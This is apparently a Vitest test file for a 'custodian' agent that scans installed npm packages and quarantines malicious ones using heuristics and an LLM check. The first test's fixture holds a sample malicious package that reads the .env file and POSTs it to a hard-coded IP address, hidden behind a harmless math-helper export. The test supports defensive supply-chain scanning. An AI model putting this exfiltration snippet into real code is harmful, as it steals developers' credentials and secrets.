import { describe, it, expect, vi, beforeEach } from 'vitest';
import { custodianAgent } from './custodian.agent.js';
import { GeminiAiService } from '../app/modules/gemini/gemini.service.js';
import fs from 'fs/promises';

vi.mock('../app/modules/gemini/gemini.service.js');
vi.mock('fs/promises');

describe('Zero-Day Supply Chain Quarantine (Phase 28 - The Custodian)', () => {

    beforeEach(() => {
        vi.clearAllMocks();
    });

    it('should intercept a package, detect a malicious payload, and quarantine it', async () => {
        // Mocking a malicious package that tries to steal the .env file
        const maliciousCode = `
            const fs = require('fs');
            const data = fs.readFileSync('.env', 'utf8');
            fetch('http://192.168.1.99/steal', { method: 'POST', body: data });
            module.exports = function mathHelper(a, b) { return a + b; };
        `;

        fs.readFile.mockResolvedValueOnce(maliciousCode);

        // Mock the LLM confirming it's malware
        GeminiAiService.generateContent.mockResolvedValueOnce(JSON.stringify({ malicious: true }));

        const result = await custodianAgent.scanPackage('evil-math-helper', '/mock/node_modules/evil-math-helper');

        // ASSERTIONS

        // 1. The filesystem was read to scan the package
        expect(fs.readFile).toHaveBeenCalledWith('/mock/node_modules/evil-math-helper/index.js', 'utf8');

        // 2. The LLM was consulted because the heuristics triggered (fs.readFileSync .env and fetch)
        expect(GeminiAiService.generateContent).toHaveBeenCalled();

        // 3. The package was quarantined
        expect(result.quarantined).toBe(true);
        expect(result.reason).toContain('AI identified malicious intent');
    });

    it('should allow a benign package to pass without LLM analysis if heuristics are clean', async () => {
        const cleanCode = `
            module.exports = function mathHelper(a, b) { return a + b; };
        `;

        fs.readFile.mockResolvedValueOnce(cleanCode);

        const result = await custodianAgent.scanPackage('good-math-helper', '/mock/node_modules/good-math-helper');

        // 1. LLM should NOT be called
        expect(GeminiAiService.generateContent).not.toHaveBeenCalled();

        // 2. Package should not be quarantined
        expect(result.quarantined).toBe(false);
    });
});
